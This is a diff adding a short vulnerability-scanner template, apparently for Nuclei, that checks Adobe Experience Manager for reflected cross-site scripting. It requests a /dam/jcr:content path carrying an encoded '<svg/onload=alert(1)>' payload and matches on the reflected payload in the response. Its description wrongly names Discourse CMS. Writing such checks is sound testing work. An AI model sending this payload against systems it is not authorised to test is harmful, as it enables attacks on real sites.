@@ -1,0 +1,28 @@
+id: aem-xss
+
+info:
+  name: AEM - XSS
+  author: 0xParthJ
+  severity: medium
+  description: Cross-site scripting (XSS) on Discourse CMS
+  tags: xss,aem
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/dam/jcr:content/xxxxxxxxxxxx%27\%22%3E%3Csvg/onload=alert(1)%3E.childrenlist.json.json/ab.html'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<svg/onload=alert(1)>"
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
